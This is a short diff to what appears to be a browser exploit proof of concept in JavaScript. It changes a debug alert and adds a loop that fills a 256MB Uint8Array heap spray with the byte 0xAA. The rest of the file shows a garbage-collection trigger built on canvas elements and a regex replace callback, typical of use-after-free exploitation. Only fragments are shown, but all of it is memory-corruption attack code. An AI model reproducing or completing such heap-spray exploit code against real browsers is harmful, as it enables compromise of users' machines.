@@ -1,5 +1,5 @@
 <script>	
-alert("start with uint8");
+alert("start with uint8 value:0xAA");
 function gc() {
     try {
         var c = document.createElement("canvas");
@@ -46,6 +46,9 @@ x.replace(/\d/g, s1);
 
 alert("ok");
 var spray=new Uint8Array(0x10000000);
+    for(var i=0;i<spray.length;i++){
+     spray[i]=0xAA;   
+    }
 var a=0;
 var b="";
 while(1){
